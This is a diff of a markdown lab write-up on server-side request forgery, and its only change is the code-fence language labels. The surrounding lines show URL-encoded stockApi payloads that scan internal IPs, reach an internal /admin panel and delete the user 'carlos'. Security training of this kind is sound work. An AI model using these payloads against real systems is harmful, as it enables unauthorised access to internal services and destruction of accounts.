@@ -28,7 +28,7 @@
 
 > I use `Hackvertor` extension for easy work with request body in `url encoding`:
 
-```http
+```bash
 
 stockApi=<@urlencode>http://192.168.0.1:8080/product/stock/check?productId=1&storeId=1</@urlencode>
 
@@ -38,7 +38,7 @@ stockApi=<@urlencode>http://192.168.0.1:8080/product/stock/check?productId=1&sto
 
 > I try to change the address and send to `192.168.0.2:8080`:
 
-```http
+```bash
 
 stockApi=<@urlencode>http://192.168.0.2:8080/product/stock/check?productId=1&storeId=1</@urlencode>
 
@@ -130,7 +130,7 @@ ________________________________________________
 > request to `192.168.0.234` returned status `404` - `not found`. This means that there is something at this address, but at the current endopoint `/product/stock/check?productId=1`
 > the server could not return data. I need to access the admin panel. To do this, I substitute the endpoint `/admin` using a request to `192.168.0.234`:
 
-```http
+```bash
 
 stockApi=<@urlencode>http://192.168.0.234:8080/admin</@urlencode>
 
@@ -141,7 +141,7 @@ stockApi=<@urlencode>http://192.168.0.234:8080/admin</@urlencode>
 
 > Sending a request to delete user `Carlos`:
 
-```http
+```bash
 
 stockApi=<@urlencode>http://192.168.0.234:8080/admin/delete?username=carlos</@urlencode>
 
